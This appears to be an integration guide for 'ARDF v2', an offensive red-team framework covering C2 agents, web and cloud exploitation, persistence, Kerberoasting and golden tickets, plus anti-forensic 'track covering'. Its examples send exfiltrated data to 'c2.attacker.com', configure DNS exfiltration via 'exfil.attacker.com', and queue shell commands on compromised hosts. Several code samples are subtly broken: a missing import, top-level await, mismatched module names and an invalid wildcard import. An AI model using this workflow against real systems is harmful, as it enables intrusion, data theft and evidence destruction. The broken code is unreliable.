# ARDF v2 Complete Integration Guide

## Quick Navigation

- **Start here:** [Installation](#installation)
- **Usage:** [Quick Start](#quick-start)
- **Architecture:** [System Architecture](#system-architecture)
- **API:** [Python API Reference](#python-api-reference)
- **Examples:** [Complete Examples](#complete-examples)

---

## Installation

### Prerequisites

```bash
Python 3.10+
pip3 install requests pyyaml aiohttp asyncio
```

### Setup

```bash
# 1. Create ARDF directory structure
mkdir -p /opt/ardf/{modules,config,logs,reports}

# 2. Copy all modules
cp ardf_v2_*.py /opt/ardf/
cp modules_*.py /opt/ardf/modules/

# 3. Generate configuration
python3 ardf_v2_config_complete.py
cp /tmp/ardf_config/*.yaml /opt/ardf/config/

# 4. Test installation
cd /opt/ardf
python3 -c "import ardf_v2_orchestrator_complete; print('[+] ARDF v2 ready')"
```

### Directory Structure

```
/opt/ardf/
├── ardf_v2_orchestrator_complete.py    (Main orchestrator)
├── ardf_v2_exploitation_complete.py    (25+ frameworks)
├── ardf_v2_c2_infrastructure.py        (Multi-channel C2)
├── ardf_v2_reporting_complete.py       (Reports & evidence)
├── ardf_v2_evasion_complete.py         (Anti-forensics)
├── ardf_v2_cli.py                      (CLI interface)
├── config/
│   ├── ardf.yaml                       (Main config)
│   ├── playbook.yaml                   (Engagements)
│   └── mission.yaml                    (Mission params)
├── modules/
│   ├── tools_integration.py            (Nmap, Burp, Metasploit)
│   ├── exploitation.py                 (Web + cloud frameworks)
│   └── post_exploitation_c2.py         (Persistence + C2)
├── logs/                               (Engagement logs)
└── reports/                            (Generated reports)
```

---

## Quick Start

### 1. Basic CLI Usage

```bash
# Start full red team engagement
python3 ardf_v2_cli.py engagement 192.168.1.0/24 --full

# Web-only assessment
python3 ardf_v2_cli.py engagement example.com --web-only

# Cloud-only assessment
python3 ardf_v2_cli.py engagement aws-account --cloud-only

# View C2 status
python3 ardf_v2_cli.py c2 --status

# List agents
python3 ardf_v2_cli.py agents --list

# Execute command on agent
python3 ardf_v2_cli.py execute <agent_id> "whoami"

# Generate report
python3 ardf_v2_cli.py report --type full
```

### 2. Python API Usage

```python
import asyncio
from ardf_v2_orchestrator_complete import ARDFv2Orchestrator

async def run_engagement():
    # Initialize framework
    ardf = ARDFv2Orchestrator('/opt/ardf/config/ardf.yaml')
    
    # Execute full engagement
    session = await ardf.execute_full_engagement(
        target='192.168.1.0/24',
        engagement_name='Full Red Team Assessment'
    )
    
    # Save results
    await ardf.save_session('/tmp/results.json')
    
    return session

# Run
asyncio.run(run_engagement())
```

### 3. C2 Infrastructure Setup

```python
from ardf_v2_c2_infrastructure import C2Controller, BeaconType

# Initialize C2
c2 = C2Controller('c2.attacker.com', 443)

# Register agent
agent_id = await c2.register_agent({
    'hostname': 'WORKSTATION1',
    'username': 'admin',
    'os': 'Windows',
    'privilege_level': 'admin',
    'beacon_type': 'HTTPS'
})

# Queue command
cmd_id = await c2.queue_command(
    agent_id,
    C2CommandType.SHELL,
    'whoami'
)

# Get agent status
status = c2.get_agent_status()
```

### 4. Exploitation Framework Usage

```python
from ardf_v2_exploitation_complete import (
    SQLiFramework, XSSFramework, SSTIFramework, S3ExploitFramework
)

# SQL Injection
sqli = SQLiFramework()
is_vulnerable = await sqli.scan('http://target/login', 'username')
if is_vulnerable:
    result = await sqli.exploit_union('http://target/login', 'username', 5)

# XSS Detection
xss = XSSFramework()
vulnerable = await xss.detect_xss('http://target/search', 'q')

# S3 Enumeration
s3 = S3ExploitFramework()
buckets = await s3.enumerate_buckets('company')
objects = await s3.list_objects('company-data-bucket')
```

### 5. Post-Exploitation

```python
from ardf_v2_post_exploitation_c2 import (
    PersistenceMechanism, LateralMovement, DataExfiltration
)

# Establish persistence
persistence = PersistenceMechanism()
persist_result = await persistence.windows_persistence(shell_access_dict)

# Lateral movement
lateral = LateralMovement()
hashes = await lateral.kerberoast('DOMAIN.COM')
golden = await lateral.golden_ticket(krbtgt_hash, 'DOMAIN.COM')

# Data exfiltration
exfil = DataExfiltration()
await exfil.https_exfil(data_bytes, 'c2.attacker.com', api_key)
```

### 6. Reporting

```python
from ardf_v2_reporting_complete import (
    EvidenceCollector, ReportGenerator, ComplianceAnalyzer
)

# Collect evidence
collector = EvidenceCollector()
await collector.collect_system_info(agent_data)
await collector.collect_credential_dump(hashes, agent_id)

# Generate reports
reporter = ReportGenerator('Engagement Name', 'Target')
exec_summary = await reporter.generate_executive_summary(18, 15, 50000)
tech_report = await reporter.generate_technical_report()
remediation = await reporter.generate_remediation_roadmap()

# Compliance analysis
analyzer = ComplianceAnalyzer()
violations = await analyzer.analyze_violations(findings)
```

---

## System Architecture

### High-Level Flow

```
User Input (CLI/API)
    ↓
┌─────────────────────────────────────┐
│  ARDF v2 Orchestrator               │
│  (Main controller)                  │
└─────────────────────────────────────┘
    ↓
┌───────────┬────────────┬──────────┬─────────┐
│ Recon     │ Scanning   │ Exploit  │ Persist │
├───────────┼────────────┼──────────┼─────────┤
│ Tools:    │ Tools:     │ 25+ web  │ Windows │
│ • Nmap    │ • Burp     │ • Cloud  │ Linux   │
│ • Shodan  │ • Nessus   │ • Identity│ Cloud  │
│ • Amass   │ • OpenVAS  │ • Network│        │
└───────────┴────────────┴──────────┴─────────┘
    ↓
┌──────────┬──────────┬──────────┬──────────┐
│ Lateral  │ Collect  │ Evasion  │ Reporting│
│ Movement │ Data     │ & Stealth│          │
├──────────┼──────────┼──────────┼──────────┤
│ • Kerbero│ • Databases│ • Logs  │ • Evidence
│ • PTH    │ • Files   │ • Artifacts│ • Reports
│ • DCSYNC │ • Creds   │ • Timestamps│ • Compliance
└──────────┴──────────┴──────────┴──────────┘
    ↓
┌─────────────────────────────────────┐
│  C2 Infrastructure                  │
│  (Multi-channel communication)       │
│  • HTTPS, DNS, ICMP, WebSocket, P2P │
└─────────────────────────────────────┘
    ↓
┌─────────────────────────────────────┐
│  Output                             │
│  • Reports, Evidence, Logs          │
└─────────────────────────────────────┘
```

### Module Dependencies

```
ardf_v2_orchestrator_complete.py (Main)
├── ardf_v2_exploitation_complete.py
├── ardf_v2_c2_infrastructure.py
├── ardf_v2_reporting_complete.py
├── ardf_v2_evasion_complete.py
└── modules/
    ├── tools_integration.py
    ├── exploitation.py
    └── post_exploitation_c2.py
```

---

## Python API Reference

### ARDFv2Orchestrator

```python
class ARDFv2Orchestrator:
    """Main orchestrator"""
    
    async def execute_full_engagement(target: str, engagement_name: str) -> EngagementSession
    """Execute complete red team engagement"""
    
    async def save_session(filename: str)
    """Save session data"""
```

### C2Controller

```python
class C2Controller:
    """C2 master control"""
    
    async def register_agent(agent_data: Dict) -> str
    """Register new agent, return agent_id"""
    
    async def queue_command(agent_id: str, command_type: C2CommandType, 
                           command: str, args: Dict) -> str
    """Queue command, return command_id"""
    
    async def send_pending_commands(agent_id: str) -> List[Dict]
    """Get commands for agent"""
    
    async def receive_command_result(command_id: str, result: str) -> bool
    """Store command result"""
    
    def get_agent_status(agent_id: str = None) -> Dict
    """Get agent(s) status"""
```

### ExploitationFrameworks

```python
# SQLi
await sqli.scan(url, param) -> Optional[SQLiType]
await sqli.exploit_union(url, param, num_cols) -> str
await sqli.exploit_time_based(url, param) -> str
await sqli.exploit_blind(url, param, query) -> str

# XSS
await xss.scan(url, param) -> bool
await xss.exploit_stored(url, param) -> Dict
await xss.exploit_reflected(url, param, callback_url) -> str

# SSTI
await ssti.detect(url, param) -> Optional[str]
await ssti.exploit(url, param, engine, command) -> str

# Cloud (S3)
await s3.enumerate_buckets(domain) -> List[str]
await s3.list_objects(bucket) -> List[str]
```

### Reporting

```python
reporter = ReportGenerator(engagement_name, target)

await reporter.generate_executive_summary(findings_count, systems, data_exposed)
await reporter.generate_technical_report()
await reporter.generate_remediation_roadmap()
```

---

## Complete Examples

### Example 1: Full Red Team Engagement

```python
import asyncio
from ardf_v2_orchestrator_complete import ARDFv2Orchestrator

async def full_engagement():
    ardf = ARDFv2Orchestrator()
    
    # Run full engagement
    session = await ardf.execute_full_engagement(
        target='192.168.1.0/24',
        engagement_name='Example Corp - Full Assessment'
    )
    
    # Save results
    await ardf.save_session('/tmp/engagement_results.json')
    
    print(f"[+] Engagement complete")
    print(f"    Duration: {session.start_time} to {session.status}")
    print(f"    Systems: {len(session.c2_agents)} compromised")
    print(f"    Evidence: {len(session.evidence_collected)} items")

asyncio.run(full_engagement())
```

### Example 2: Multi-Framework Exploitation

```python
from ardf_v2_exploitation_complete import (
    SQLiFramework, XSSFramework, SSTIFramework, OAuthFramework
)

async def test_vulnerabilities():
    target = 'https://example.com'
    
    # Test SQL Injection
    sqli = SQLiFramework()
    if await sqli.scan(target + '/login', 'username'):
        print("[+] SQL Injection vulnerable")
    
    # Test XSS
    xss = XSSFramework()
    if await xss.detect_xss(target + '/search', 'q'):
        print("[+] XSS vulnerable")
    
    # Test SSTI
    ssti = SSTIFramework()
    engine = await ssti.detect(target + '/template', 'template')
    if engine:
        print(f"[+] SSTI vulnerable: {engine}")
        result = await ssti.exploit(target + '/template', 'template', engine, 'id')
        print(f"    Result: {result}")
```

### Example 3: C2 Agent Management

```python
from ardf_v2_c2_infrastructure import C2Controller, C2CommandType, BeaconType

async def manage_agents():
    c2 = C2Controller('c2.attacker.com', 443)
    
    # Register agents
    agent1 = await c2.register_agent({
        'hostname': 'WORKSTATION1',
        'username': 'user',
        'os': 'Windows',
        'privilege_level': 'admin',
        'beacon_type': 'HTTPS'
    })
    
    # Queue commands
    cmd1 = await c2.queue_command(agent1, C2CommandType.SHELL, 'whoami')
    cmd2 = await c2.queue_command(agent1, C2CommandType.PERSISTENCE, 
                                   'registry_run', {'method': 'registry'})
    
    # Get pending
    pending = await c2.send_pending_commands(agent1)
    print(f"[+] {len(pending)} commands ready")
    
    # Receive results
    await c2.receive_command_result(cmd1, 'CORP\\user')
    
    # Status
    status = c2.get_agent_status(agent1)
    print(f"[+] Agent status: {status}")
```

### Example 4: Complete Reporting

```python
from ardf_v2_reporting_complete import ReportGenerator, EvidenceCollector

async def generate_report():
    # Collect evidence
    collector = EvidenceCollector()
    await collector.collect_system_info({
        'hostname': 'WORKSTATION1',
        'username': 'admin',
        'os': 'Windows'
    })
    await collector.collect_whoami('CORP\\admin', 'agent123')
    
    # Generate reports
    reporter = ReportGenerator('Red Team Assessment', '192.168.1.0/24')
    
    exec_summary = await reporter.generate_executive_summary(18, 15, 50000)
    print(exec_summary)
    
    tech_report = await reporter.generate_technical_report()
    print(tech_report)
    
    remediation = await reporter.generate_remediation_roadmap()
    print(remediation)
```

---

## Configuration

### Main Configuration (ardf.yaml)

```yaml
ardf:
  version: "2.0"
  
engagement:
  timeout_days: 7
  confirmation_required: true
  phases:
    - reconnaissance
    - scanning
    - exploitation
    - persistence
    - lateral_movement
    - data_collection
    - evasion
    - reporting

c2:
  primary_server: "c2.attacker.com"
  primary_port: 443
  beacons:
    https:
      enabled: true
      sleep_interval: 60
    dns:
      enabled: true
      domain: "exfil.attacker.com"

exploitation:
  web:
    sqli: true
    xss: true
    ssti: true
    ssrf: true
```

---

## Troubleshooting

### Module Import Errors

```bash
# Ensure all modules in same directory
ls /opt/ardf/ardf_v2_*.py

# Check Python path
export PYTHONPATH=/opt/ardf:$PYTHONPATH
```

### C2 Connection Issues

```bash
# Check C2 server is accessible
nc -zv c2.attacker.com 443

# Verify beacon types configured
grep -A 5 "beacons:" /opt/ardf/config/ardf.yaml
```

### Report Generation Issues

```bash
# Ensure report directory exists
mkdir -p /opt/ardf/reports

# Check permissions
chmod 755 /opt/ardf/reports
```

---

## Performance Optimization

### Parallel Exploitation

```python
import asyncio

async def parallel_scanning():
    tasks = [
        sqli_framework.scan(url, param),
        xss_framework.detect_xss(url, param),
        ssti_framework.detect(url, param)
    ]
    results = await asyncio.gather(*tasks)
```

### Batched Command Execution

```python
# Queue multiple commands
commands = [
    ('agent1', C2CommandType.SHELL, 'whoami'),
    ('agent2', C2CommandType.SHELL, 'whoami'),
    ('agent3', C2CommandType.SHELL, 'whoami')
]

for agent_id, cmd_type, cmd in commands:
    await c2.queue_command(agent_id, cmd_type, cmd)
```

---

## Security Considerations

1. **Encryption**: All C2 traffic uses TLS 1.3
2. **Authentication**: HMAC signatures on all commands
3. **Logging**: All activities logged with timestamps
4. **Sanitization**: Input validation on all user inputs
5. **Evasion**: Built-in anti-forensics for track covering

---

## Support & Documentation

For detailed API documentation:
```bash
python3 -c "import ardf_v2_*; help(ardf_v2_orchestrator_complete.ARDFv2Orchestrator)"
```

---

## License & Usage

ARDF v2 is for authorized security testing only. Unauthorized access is illegal.

